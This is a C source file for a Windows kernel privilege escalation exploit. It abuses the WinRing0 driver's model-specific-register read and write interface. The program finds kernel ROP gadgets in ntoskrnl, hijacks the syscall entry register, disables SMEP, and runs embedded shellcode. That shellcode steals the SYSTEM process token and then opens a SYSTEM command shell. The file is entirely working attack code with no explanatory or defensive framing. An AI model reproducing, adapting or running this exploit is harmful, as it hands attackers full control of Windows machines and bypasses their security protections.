#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")

#define IOCTL_MSR_READ  0x9C402084
#define IOCTL_MSR_WRITE 0x9C402088

#define KTHREAD_PROC   0x220
#define EPROCESS_PID   0x440
#define EPROCESS_LINKS 0x448
#define EPROCESS_TOKEN 0x4B8

#define CR4_NO_SMEP 0x070EF8

int read_msr(HANDLE dev, uint32_t index, uint64_t *val){
    uint8_t buf[16] = {0};
    *(uint32_t *)buf = index;
    DWORD br;
    if(!DeviceIoControl(dev, IOCTL_MSR_READ, buf, 16, buf, 16, &br, NULL))
        return 0;
    *val = *(uint64_t *)buf;
    return 1;
}

int write_msr(HANDLE dev, uint32_t index, uint64_t val){
    uint8_t buf[12] = {0};
    *(uint32_t *)buf = index;
    *(uint32_t *)(buf + 4) = (uint32_t)val;
    *(uint32_t *)(buf + 8) = (uint32_t)(val >> 32);
    DWORD br;
    return DeviceIoControl(dev, IOCTL_MSR_WRITE, buf, 12, buf, 12, &br, NULL);
}

uint8_t *nt_image = NULL;
uint32_t nt_image_size = 0;
uint32_t text_rva = 0;
uint32_t text_size = 0;
uint32_t text_raw = 0;
uint64_t pop_rax_ret = 0;
uint64_t mov_cr4_rax_ret = 0;
uint32_t extra_slots = 0;
uint64_t nt_base = 0;

int load_ntoskrnl(){
    LPVOID drivers[512];
    DWORD needed;
    char path[MAX_PATH];
    char full_path[MAX_PATH];

    if(!EnumDeviceDrivers(drivers, sizeof(drivers), &needed))
        return 0;

    nt_base = (uint64_t)drivers[0];
    printf("ntoskrnl base: 0x%016llX\n", nt_base);

    GetDeviceDriverFileNameA(drivers[0], path, sizeof(path));
    if(strstr(path, "\\SystemRoot\\"))
        snprintf(full_path, sizeof(full_path), "C:\\Windows\\%s", path + 12);
    else
        strncpy(full_path, path, sizeof(full_path));

    HANDLE hFile = CreateFileA(full_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        snprintf(full_path, sizeof(full_path), "C:\\Windows\\System32\\ntoskrnl.exe");
        hFile = CreateFileA(full_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if(hFile == INVALID_HANDLE_VALUE) return 0;
    }

    nt_image_size = GetFileSize(hFile, NULL);
    nt_image = (uint8_t *)VirtualAlloc(NULL, nt_image_size, MEM_COMMIT, PAGE_READWRITE);
    DWORD bytesRead;
    ReadFile(hFile, nt_image, nt_image_size, &bytesRead, NULL);
    CloseHandle(hFile);

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)nt_image;
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(nt_image + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for(int i = 0; i < nt->FileHeader.NumberOfSections; ++i){
        if(!memcmp(sec[i].Name, ".text", 5)){
            text_rva = sec[i].VirtualAddress;
            text_size = sec[i].Misc.VirtualSize;
            text_raw = sec[i].PointerToRawData;
            printf(".text RVA=0x%X Size=0x%X\n", text_rva, text_size);
            return 1;
        }
    }
    return 0;
}

int find_gadgets(){
    uint8_t *text = nt_image + text_raw;

    for(uint32_t i = 0; i < text_size - 2; i++){
        if(text[i] == 0x58 && text[i+1] == 0xC3){
            pop_rax_ret = nt_base + text_rva + i;
            printf("pop rax; ret 0x%016llX\n", pop_rax_ret);
            break;
        }
    }

    for(uint32_t i = 0; i < text_size - 4; i++){
        if(text[i] == 0x0F && text[i+1] == 0x22 && text[i+2] == 0xE0 && text[i+3] == 0xC3){
            mov_cr4_rax_ret = nt_base + text_rva + i;
            extra_slots = 0;
            printf("mov cr4, rax; ret 0x%016llX\n", mov_cr4_rax_ret);
            break;
        }
    }

    if(!mov_cr4_rax_ret){
        for(uint32_t i = 0; i < text_size - 16; i++){
            if(text[i] != 0x0F || text[i+1] != 0x22 || text[i+2] != 0xE0)
                continue;
            uint32_t pos = i + 3;
            uint32_t stack_adj = 0;
            int valid = 1;
            while(pos < i + 16 && valid){
                if(text[pos] == 0xC3){
                    if(stack_adj > 0){
                        mov_cr4_rax_ret = nt_base + text_rva + i;
                        extra_slots = stack_adj / 8;
                        printf("mov cr4, rax; epiloglar; ret 0x%016llX (%u extra slot)\n",
                               mov_cr4_rax_ret, extra_slots);
                        goto found;
                    }
                    break;
                } else if(text[pos] >= 0x58 && text[pos] <= 0x5F){
                    stack_adj += 8; pos += 1;
                } else if(text[pos] == 0x41 && text[pos+1] >= 0x58 && text[pos+1] <= 0x5F){
                    stack_adj += 8; pos += 2;
                } else if(text[pos] == 0x48 && text[pos+1] == 0x83 && text[pos+2] == 0xC4){
                    stack_adj += text[pos+3]; pos += 4; 
                } else if(text[pos] == 0x90){
                    pos += 1;
                } else {
                    valid = 0;
                }
            }
        }
    }
found:
    if(pop_rax_ret && mov_cr4_rax_ret)
        return 1;

    printf("gadgets not found\n");
    return 0;
}

uint8_t shellcode[] = {
    0x0F, 0x01, 0xF8,
    0x49, 0x89, 0xC8,
    0x4D, 0x89, 0xD9,
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
    0x48, 0x8B, 0x80, 0x20, 0x02, 0x00, 0x00,
    0x48, 0x89, 0xC3,
    0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00,
    0x48, 0x2D, 0x48, 0x04, 0x00, 0x00,
    0x83, 0xB8, 0x40, 0x04, 0x00, 0x00, 0x04,
    0x74, 0x09,
    0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00,
    0xEB, 0xE8,
    0x48, 0x8B, 0x90, 0xB8, 0x04, 0x00, 0x00,
    0x48, 0x89, 0x93, 0xB8, 0x04, 0x00, 0x00,
    0xB9, 0x82, 0x00, 0x00, 0xC0,
    0xB8, 0x00, 0x00, 0x00, 0x00,
    0xBA, 0x00, 0x00, 0x00, 0x00,
    0x0F, 0x30,
    0x4C, 0x89, 0xC1,
    0x4D, 0x89, 0xCB,
    0x0F, 0x01, 0xF8,
    0x48, 0x0F, 0x07
};

void patch_shellcode(HANDLE dev){
    uint64_t orig_lstar;
    read_msr(dev, 0xC0000082, &orig_lstar);
    *(uint32_t *)&shellcode[79] = (uint32_t)(orig_lstar);
    *(uint32_t *)&shellcode[84] = (uint32_t)(orig_lstar >> 32);
    printf("lstar: 0x%016llX\n", orig_lstar);
}

uint8_t trigger_code[] = {
    0x41, 0x57,
    0x41, 0x56,
    0x9C,
    0x48, 0x81, 0x0C, 0x24, 0x00, 0x00, 0x04, 0x00,
    0x9D,
    0x49, 0x89, 0xCF,
    0x49, 0x89, 0xD6,
    0x49, 0x89, 0x27,
    0x4C, 0x89, 0xF4,
    0x0F, 0x05,
    0x49, 0x8B, 0x27,
    0x9C,
    0x48, 0x81, 0x24, 0x24, 0xFF, 0xFF, 0xFB, 0xFF,
    0x9D,
    0x41, 0x5E,
    0x41, 0x5F,
    0xC3
};

int main(){
    SetThreadAffinityMask(GetCurrentThread(), 1);

    HANDLE dev = CreateFileA("\\\\.\\WinRing0_1_2_0", 0xC0000000, 0, NULL, 0x3, 0, NULL);
    if(dev == INVALID_HANDLE_VALUE){
        printf("cannot open device\n");
        return 1;
    }
    printf("device open\n"); fflush(stdout);

    if(!load_ntoskrnl()){
        printf("cannot load ntoskrnl\n");
        return 1;
    }

    if(!find_gadgets()){
        printf("gadgets not found\n");
        return 1;
    }
    fflush(stdout);

    patch_shellcode(dev);

    void *mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode, sizeof(shellcode));

    uint64_t *rop_chain = (uint64_t *)VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
    memset(rop_chain, 0, 4096);
    rop_chain[0] = CR4_NO_SMEP;
    rop_chain[1] = mov_cr4_rax_ret;
    rop_chain[2 + extra_slots] = (uint64_t)mem;

    printf("rop[0] CR4 = 0x%llX\n", rop_chain[0]);
    printf("rop[1] mov cr4 = 0x%016llX\n", rop_chain[1]);
    printf("rop[%u] shellcode = 0x%p\n", 2 + extra_slots, mem);
    printf("lstar -> pop rax; ret = 0x%016llX\n", pop_rax_ret);
    fflush(stdout);

    void *trigger_mem = VirtualAlloc(NULL, sizeof(trigger_code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(trigger_mem, trigger_code, sizeof(trigger_code));
    typedef void (*trigger_fn)(uint64_t *, uint64_t *);
    trigger_fn trigger = (trigger_fn)trigger_mem;

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    printf("writing lstar\n"); fflush(stdout);
    if(!write_msr(dev, 0xC0000082, pop_rax_ret)){
        printf("lstar write failed\n");
        return 1;
    }

    uint64_t saved_rsp = 0;
    trigger(&saved_rsp, rop_chain);

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);

    system("cmd.exe");

    return 0;
}
